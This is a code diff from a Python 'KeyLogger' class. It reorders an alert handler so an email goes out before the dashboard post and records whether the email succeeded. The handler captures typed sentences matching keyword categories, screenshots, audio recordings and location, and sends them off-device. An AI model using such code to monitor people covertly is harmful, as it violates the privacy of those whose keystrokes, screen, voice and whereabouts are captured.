@@ -231,8 +231,19 @@ class KeyLogger:
             ss_path = take_screenshot()
             audio_path = record_audio()
             location = get_location_info()
-                
-            # Post alert to dashboard
+
+            # Send email first so we know if it succeeded
+            email_ok = self.email_service.send_alert(
+                subject=f"{result['category'].replace('_', ' ').title()} keyword detected",
+                content=sentence,
+                category=result["category"],
+                severity=result["severity"],
+                confidence=result["confidence"],
+                screenshot_path=ss_path,
+                audio_path=audio_path,
+            )
+
+            # Post alert to dashboard (include whether email was sent)
             post_to_dashboard("alert", {
                 "content": sentence,
                 "category": result["category"],
@@ -242,18 +253,8 @@ class KeyLogger:
                 "location": location,
                 "screenshot_path": ss_path,
                 "audio_path": audio_path,
+                "email_sent": email_ok,
             })
-
-            # Send email
-            self.email_service.send_alert(
-                subject=f"{result['category'].replace('_', ' ').title()} keyword detected",
-                content=sentence,
-                category=result["category"],
-                severity=result["severity"],
-                confidence=result["confidence"],
-                screenshot_path=ss_path,
-                audio_path=audio_path,
-            )
 
         # Run completely in background so keylogger isn't blocked
         t = threading.Thread(target=handle_alert, daemon=True)
